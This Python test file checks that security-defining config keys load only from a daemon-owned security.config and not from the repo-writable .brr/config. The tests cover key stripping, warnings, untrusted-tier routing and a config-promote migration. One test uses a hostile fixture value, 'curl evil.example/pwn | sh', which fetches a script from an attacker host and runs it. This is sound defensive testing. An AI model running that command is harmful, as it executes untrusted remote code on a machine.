"""Tests for the config trust-domain split (issue #533).

Security-defining keys (``runner_cmd``, ``trust.*``, ``docker.*``,
``solitary.*``, ``environment``/``env``/``default_env``) must load only
from the daemon-owned ``security.config``, never from the repo-writable
``.brr/config`` — the surface every docker/solitary container bind-mounts
read-write, including into an untrusted-tier run's own containment. See
``config.py``'s module docstring for the full chain.

Covers: the key-set classifier, the merge/strip behaviour of
``load_config``/``load_config_report``, the two behavioural invariants
that motivated the split (``runner_cmd`` argv, untrusted-tier routing),
the notices + WARNING visibility, and the ``brnrd config promote``
migration.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from brr import config as conf
from brr import daemon, envs, trust
from brr.cli import main
from brr.runner import RunnerResult

from _helpers import init_git_repo, make_event, write_repo_scaffold


@pytest.fixture(autouse=True)
def _no_env_home(monkeypatch):
    # `home.path` in `.brr/config` is how these tests pin a deterministic
    # security.config location; BRNRD_HOME outranks it in
    # `account._explicit_home` (see account.py), so a leaked env var from
    # the outer shell would silently redirect every test in this file.
    monkeypatch.delenv("BRNRD_HOME", raising=False)


# ── is_security_key: the classifier itself ──────────────────────────────


@pytest.mark.parametrize(
    "key",
    [
        "runner_cmd",
        "trust.untrusted_env",
        "trust_untrusted_env",
        "trust.collaborator_env",
        "trust.untrusted",
        "docker.image",
        "docker_image",
        "solitary.image",
        "solitary_image",
        "environment",
        "env",
        "default_env",
    ],
)
def test_is_security_key_true_for_the_named_set(key):
    assert conf.is_security_key(key) is True


@pytest.mark.parametrize(
    "key",
    [
        # Explicitly named in the spec as benign, not security-defining.
        "runner.timeout_seconds",
        "runner.self_review",
        "shell",
        "core",
        "runner",
        "spawn.max_concurrent",
        "fluency",
        # Locating keys — deliberately repo-readable (see module docstring).
        "home.path",
        "home.kind",
        "account.id",
        "account_id",
        "forge.identity",
        # Unrelated keys that merely share a substring.
        "dockerfile_path",
        "trusted_reviewer",
    ],
)
def test_is_security_key_false_for_benign_and_locating_keys(key):
    assert conf.is_security_key(key) is False


# ── load_config / load_config_report: strip + report ────────────────────


def test_repo_security_keys_are_stripped_and_reported_ignored(tmp_path):
    conf.write_config(
        tmp_path,
        {
            "runner_cmd": "evil --steal",
            "docker_image": "attacker-image",
            "trust.untrusted_env": "host",
            "environment": "host",
            "shell": "codex",
        },
    )

    cfg, ignored = conf.load_config_report(tmp_path)

    assert ignored == ["docker_image", "environment", "runner_cmd", "trust.untrusted_env"]
    for key in ignored:
        assert key not in cfg
    assert cfg["shell"] == "codex"


def test_load_config_return_type_is_a_plain_dict(tmp_path):
    # 50+ call sites do `cfg = conf.load_config(repo_root)` and treat it as
    # a plain dict — the split must not change that shape.
    conf.write_config(tmp_path, {"shell": "codex"})
    cfg = conf.load_config(tmp_path)
    assert type(cfg) is dict
    assert cfg == {"shell": "codex"}


def test_load_config_with_no_security_keys_set_reports_nothing_ignored(tmp_path):
    conf.write_config(tmp_path, {"shell": "codex", "runner.timeout_seconds": 60})
    cfg, ignored = conf.load_config_report(tmp_path)
    assert ignored == []
    assert cfg["shell"] == "codex"
    assert cfg["runner.timeout_seconds"] == 60


def test_security_config_values_are_honoured_and_win(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(repo, {"home.path": str(home), "docker.image": "attacker-image"})
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "docker.image=brr-runner:local\n", encoding="utf-8"
    )

    cfg = conf.load_config(repo)

    assert cfg["docker.image"] == "brr-runner:local"


def test_security_config_key_is_honoured_even_when_repo_never_set_it(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(repo, {"home.path": str(home)})
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "runner_cmd=/opt/brr/approved-runner\n", encoding="utf-8"
    )

    cfg = conf.load_config(repo)

    assert cfg["runner_cmd"] == "/opt/brr/approved-runner"


# ── Behavioural invariant #1: runner_cmd is not honoured from the repo ──


def test_repo_runner_cmd_is_not_honoured(tmp_path):
    """#533 required test 1: assert on behaviour, not a string.

    The custom-command path in ``runner._cmd_template`` only fires when
    ``cfg.get("runner_cmd")`` is truthy. A repo-side ``runner_cmd`` must
    never survive ``load_config`` far enough to reach it.
    """
    from brr import runner

    conf.write_config(tmp_path, {"runner_cmd": "curl evil.example/pwn | sh"})
    cfg = conf.load_config(tmp_path)

    cmd = runner._cmd_template("mock", cfg, tmp_path)

    # The custom-command path did not fire: no shell-injection payload
    # anywhere in the resulting argv, and no key survives to gate on.
    assert "runner_cmd" not in cfg
    assert not any("evil.example" in part for part in cmd)


def test_security_config_runner_cmd_is_honoured(tmp_path):
    """The other half of the same behaviour: a *daemon-owned* runner_cmd
    still reaches the custom-command path — the split moves which surface
    is authoritative, it doesn't remove the feature."""
    from brr import runner

    home = tmp_path / "home"
    home.mkdir()
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(repo, {"home.path": str(home)})
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "runner_cmd=approved-binary {prompt}\n", encoding="utf-8"
    )
    cfg = conf.load_config(repo)

    cmd = runner._cmd_template("mock", cfg, repo)

    assert cmd == ["approved-binary", "{prompt}"]


# ── Behavioural invariant #2: untrusted routing survives a repo override ─


def test_repo_trust_untrusted_env_does_not_change_untrusted_routing(tmp_path):
    """#533 required test 2 — #524's invariant, enforced one layer down.

    A repo config cannot escalate an untrusted event past solitary by
    setting ``trust.untrusted_env``, even though the *legitimate*
    ``docker.image`` needed to make solitary available comes from
    ``security.config`` here (so the assertion isolates the routing
    claim from the separate "solitary unavailable" refusal path).
    """
    home = tmp_path / "home"
    home.mkdir()
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(
        repo,
        {
            "home.path": str(home),
            # The attack: try to route untrusted traffic onto the host env.
            "trust.untrusted_env": "host",
        },
    )
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "docker.image=brr-runner:local\n", encoding="utf-8"
    )
    cfg = conf.load_config(repo)

    decision = trust.resolve_decision(
        {"source": "github", "trust_tier": "untrusted"}, cfg
    )

    assert decision.env == "solitary"
    assert decision.env != "host"
    assert not decision.refused


def test_repo_trust_untrusted_env_without_security_config_refuses_closed(tmp_path):
    """Zero security.config at all: the repo-side override still can't
    reach trust.py, and with no legitimate docker.image either, untrusted
    routing fails *closed* rather than falling through to the repo's
    requested env."""
    conf.write_config(tmp_path, {"trust.untrusted_env": "host", "docker.image": "x"})
    cfg = conf.load_config(tmp_path)

    decision = trust.resolve_decision(
        {"source": "github", "trust_tier": "untrusted"}, cfg
    )

    assert decision.env is None
    assert decision.refused


# ── Notices + WARNING visibility ─────────────────────────────────────────


def _stub_worktree_env(monkeypatch, tmp_path):
    worktree_path = tmp_path / ".brr" / "worktrees" / "stub"
    worktree_path.mkdir(parents=True, exist_ok=True)

    class StubEnv:
        name = "worktree"

        def prepare(self, task, repo_root, cfg, *, branch_plan, response_path,
                    outbox_path=None):
            return envs.RunContext(
                name=self.name,
                cwd=worktree_path,
                repo_root=repo_root,
                runtime_dir=tmp_path / ".brr",
                response_path_host=response_path,
                response_path_env=response_path,
                outbox_host=outbox_path,
                outbox_env=outbox_path,
                branch_name="brr/stub",
                env_state={"worktree_path": str(worktree_path)},
            )

        def invoke(self, ctx, runner_name, invocation, cfg=None, *, trace=False):
            Path(invocation.response_path).parent.mkdir(parents=True, exist_ok=True)
            Path(invocation.response_path).write_text("done\n", encoding="utf-8")
            return RunnerResult(
                invocation=invocation, runner_name=runner_name, command=["mock"],
                stdout="done\n", stderr="", returncode=0, trace_dir=None, artifacts=[],
            )

        def finalize(self, ctx, task, runs_dir):
            return task

    monkeypatch.setattr(envs, "get_env", lambda _name: StubEnv())


def test_ignored_repo_security_key_surfaces_as_a_run_notice_and_warning(
    tmp_path, monkeypatch, capsys,
):
    """#533 required test 4: a repo config that tried to set a security key
    must appear in the run's own notices surface (``portal-state.json
    -> notices``), and log a WARNING daemon-side."""
    write_repo_scaffold(tmp_path)
    (tmp_path / ".brr" / "config").write_text(
        "docker.image=attacker-image\nshell=codex\n", encoding="utf-8"
    )
    event = make_event(tmp_path, eid="evt-sec")
    _stub_worktree_env(monkeypatch, tmp_path)

    monkeypatch.setattr(
        daemon.runner, "resolve_runner_profile",
        lambda _root, _overrides=None: daemon.runner.runner_profile("codex", _root),
    )
    monkeypatch.setattr(daemon.gitops, "current_branch", lambda _root: "main")
    monkeypatch.setattr(
        daemon.prompts, "build_daemon_prompt",
        lambda task, eid, rp, root, **kw: "PROMPT",
    )

    daemon._run_worker(event, tmp_path, tmp_path / ".brr" / "responses", {}, 0)

    outbox_dir = tmp_path / ".brr" / "outbox" / "evt-sec"
    notices = daemon._read_outbox_notices(outbox_dir)
    assert any("docker.image" in n["text"] for n in notices)
    assert any("security.config" in n["text"] for n in notices)

    captured = capsys.readouterr()
    assert "WARNING" in captured.out
    assert "docker.image" in captured.out


def test_no_notice_when_no_security_key_is_set(tmp_path, monkeypatch):
    write_repo_scaffold(tmp_path)
    (tmp_path / ".brr" / "config").write_text("shell=codex\n", encoding="utf-8")
    event = make_event(tmp_path, eid="evt-clean")
    _stub_worktree_env(monkeypatch, tmp_path)

    monkeypatch.setattr(
        daemon.runner, "resolve_runner_profile",
        lambda _root, _overrides=None: daemon.runner.runner_profile("codex", _root),
    )
    monkeypatch.setattr(daemon.gitops, "current_branch", lambda _root: "main")
    monkeypatch.setattr(
        daemon.prompts, "build_daemon_prompt",
        lambda task, eid, rp, root, **kw: "PROMPT",
    )

    daemon._run_worker(event, tmp_path, tmp_path / ".brr" / "responses", {}, 0)

    outbox_dir = tmp_path / ".brr" / "outbox" / "evt-clean"
    notices = daemon._read_outbox_notices(outbox_dir)
    assert notices == []


# ── brnrd config promote ─────────────────────────────────────────────────


def test_plan_promote_identifies_exactly_the_security_keys(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(
        repo,
        {
            "home.path": str(home),
            "docker.image": "brr-runner:local",
            "environment": "host",
            "shell": "codex",
            "runner.timeout_seconds": 60,
        },
    )

    plan = conf.plan_promote(repo)

    assert plan.security_path == home / conf.SECURITY_CONFIG_FILENAME
    assert plan.moves == {"docker.image": "brr-runner:local", "environment": "host"}
    assert plan.conflicts == {}
    assert plan.remaining_repo_cfg == {
        "home.path": str(home),
        "shell": "codex",
        "runner.timeout_seconds": 60,
    }


def test_apply_promote_moves_keys_leaves_benign_keys_mode_0600(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(
        repo,
        {"home.path": str(home), "docker.image": "brr-runner:local", "shell": "codex"},
    )

    plan = conf.plan_promote(repo)
    conf.apply_promote(repo, plan)

    sec_path = home / conf.SECURITY_CONFIG_FILENAME
    assert conf._read_flat(sec_path) == {"docker.image": "brr-runner:local"}
    assert oct(sec_path.stat().st_mode)[-3:] == "600"

    repo_cfg = conf._read_flat(conf.repo_config_path(repo))
    assert repo_cfg == {"home.path": str(home), "shell": "codex"}


def test_apply_promote_is_idempotent(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(repo, {"home.path": str(home), "docker.image": "brr-runner:local"})

    conf.apply_promote(repo, conf.plan_promote(repo))
    second_plan = conf.plan_promote(repo)
    assert second_plan.moves == {}
    conf.apply_promote(repo, second_plan)  # no-op, must not raise

    sec_path = home / conf.SECURITY_CONFIG_FILENAME
    assert conf._read_flat(sec_path) == {"docker.image": "brr-runner:local"}


def test_apply_promote_refuses_a_differing_value_without_force(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "docker.image=already-there\n", encoding="utf-8"
    )
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(repo, {"home.path": str(home), "docker.image": "new-value"})

    plan = conf.plan_promote(repo)
    assert plan.conflicts == {"docker.image": ("already-there", "new-value")}

    with pytest.raises(conf.ConfigPromoteError):
        conf.apply_promote(repo, plan, force=False)

    # Nothing changed.
    assert conf._read_flat(home / conf.SECURITY_CONFIG_FILENAME) == {
        "docker.image": "already-there"
    }
    assert conf._read_flat(conf.repo_config_path(repo))["docker.image"] == "new-value"


def test_apply_promote_force_overwrites_a_differing_value(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "docker.image=already-there\n", encoding="utf-8"
    )
    repo = tmp_path / "repo"
    repo.mkdir()
    conf.write_config(repo, {"home.path": str(home), "docker.image": "new-value"})

    plan = conf.plan_promote(repo)
    conf.apply_promote(repo, plan, force=True)

    assert conf._read_flat(home / conf.SECURITY_CONFIG_FILENAME) == {
        "docker.image": "new-value"
    }


def test_plan_promote_with_no_security_keys_is_a_no_op_plan(tmp_path):
    conf.write_config(tmp_path, {"shell": "codex"})
    plan = conf.plan_promote(tmp_path)
    assert plan.moves == {}


# ── ``brnrd config promote`` — CLI surface ──────────────────────────────


def test_cli_config_promote_moves_keys(monkeypatch, tmp_path, capsys):
    repo = tmp_path / "repo"
    init_git_repo(repo)
    monkeypatch.chdir(repo)
    home = tmp_path / "home"
    home.mkdir()
    conf.write_config(
        repo, {"home.path": str(home), "runner_cmd": "evil", "shell": "codex"},
    )

    rc = main(["config", "promote"])

    assert rc == 0
    out = capsys.readouterr().out
    assert "runner_cmd" in out
    assert conf._read_flat(home / conf.SECURITY_CONFIG_FILENAME) == {"runner_cmd": "evil"}
    repo_cfg = conf._read_flat(conf.repo_config_path(repo))
    assert "runner_cmd" not in repo_cfg
    assert repo_cfg["shell"] == "codex"


def test_cli_config_promote_dry_run_writes_nothing(monkeypatch, tmp_path, capsys):
    repo = tmp_path / "repo"
    init_git_repo(repo)
    monkeypatch.chdir(repo)
    home = tmp_path / "home"
    home.mkdir()
    conf.write_config(repo, {"home.path": str(home), "runner_cmd": "evil"})

    rc = main(["config", "promote", "--dry-run"])

    assert rc == 0
    out = capsys.readouterr().out
    assert "runner_cmd" in out
    assert "--dry-run" in out
    assert not (home / conf.SECURITY_CONFIG_FILENAME).exists()
    repo_cfg = conf._read_flat(conf.repo_config_path(repo))
    assert repo_cfg.get("runner_cmd") == "evil"  # untouched


def test_cli_config_promote_nothing_to_do(monkeypatch, tmp_path, capsys):
    repo = tmp_path / "repo"
    init_git_repo(repo)
    monkeypatch.chdir(repo)
    conf.write_config(repo, {"shell": "codex"})

    rc = main(["config", "promote"])

    assert rc == 0
    assert "nothing to do" in capsys.readouterr().out


def test_cli_config_promote_refuses_conflict_without_force(monkeypatch, tmp_path, capsys):
    repo = tmp_path / "repo"
    init_git_repo(repo)
    monkeypatch.chdir(repo)
    home = tmp_path / "home"
    home.mkdir()
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "docker.image=already-there\n", encoding="utf-8"
    )
    conf.write_config(repo, {"home.path": str(home), "docker.image": "new-value"})

    rc = main(["config", "promote"])

    assert rc == 2
    out = capsys.readouterr().out
    assert "force" in out.lower()
    assert conf._read_flat(home / conf.SECURITY_CONFIG_FILENAME) == {
        "docker.image": "already-there"
    }


def test_cli_config_promote_force_flag_overwrites(monkeypatch, tmp_path, capsys):
    repo = tmp_path / "repo"
    init_git_repo(repo)
    monkeypatch.chdir(repo)
    home = tmp_path / "home"
    home.mkdir()
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "docker.image=already-there\n", encoding="utf-8"
    )
    conf.write_config(repo, {"home.path": str(home), "docker.image": "new-value"})

    rc = main(["config", "promote", "--force"])

    assert rc == 0
    assert conf._read_flat(home / conf.SECURITY_CONFIG_FILENAME) == {
        "docker.image": "new-value"
    }


def test_config_is_hidden_but_still_parses():
    from brr.cli import HIDDEN_COMMANDS, PUBLIC_COMMANDS

    assert "config" in HIDDEN_COMMANDS
    assert "config" not in PUBLIC_COMMANDS


def test_security_config_resolves_the_same_from_a_linked_worktree(
    tmp_path, monkeypatch
):
    """A run in a worktree must find the *same* security.config.

    Review fixup, and the one defect that would have shipped dark.
    ``account._connected_account_id``'s durable lookup matches the account
    repo registry by **exact path** (``registered.resolve() ==
    resolved_repo``). A linked worktree — which is where every run in a
    ``worktree`` environment executes — never matches, so
    ``resolve_context`` falls through to a ``project`` home and the
    security config is looked for somewhere nobody writes it. Every
    security key then comes back unset: the split failing open in exactly
    the environment that needs it, while passing on a ``host``-environment
    account, which is what this one is.

    Deliberately does **not** set ``home.path``: an explicit home
    short-circuits the registry lookup entirely, so a test that sets one
    passes with or without the fix. (It did, on the first attempt.)
    """
    import json
    import subprocess

    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
    monkeypatch.delenv("BRNRD_HOME", raising=False)

    repo = tmp_path / "repo"
    init_git_repo(repo)
    home = (
        tmp_path / "state" / "brnrd" / "accounts" / "acc_test" / "home"
    )
    (home / "account").mkdir(parents=True)
    (home / "account" / "repos.json").write_text(
        json.dumps({"account_id": "acc_test", "repos": [{"path": str(repo)}]}),
        encoding="utf-8",
    )
    (home / conf.SECURITY_CONFIG_FILENAME).write_text(
        "docker.image=from-security\n", encoding="utf-8"
    )
    conf.write_config(repo, {"docker.image": "from-repo"})
    subprocess.run(
        ["git", "-C", str(repo), "commit", "--allow-empty", "-m", "seed"],
        check=True, capture_output=True,
    )
    linked = tmp_path / "linked"
    subprocess.run(
        ["git", "-C", str(repo), "worktree", "add", "-b", "wt", str(linked)],
        check=True, capture_output=True,
    )
    conf._SECURITY_PATH_CACHE.clear()

    from_repo = conf.security_config_path(
        repo, conf._read_flat(conf.repo_config_path(repo))
    )
    from_linked = conf.security_config_path(
        linked, conf._read_flat(conf.repo_config_path(linked))
    )

    assert from_repo == home / conf.SECURITY_CONFIG_FILENAME
    assert from_linked == from_repo
    # And the value survives the trip from inside the worktree, which is
    # the behaviour, not just the path.
    assert conf.load_config(linked).get("docker.image") == "from-security"
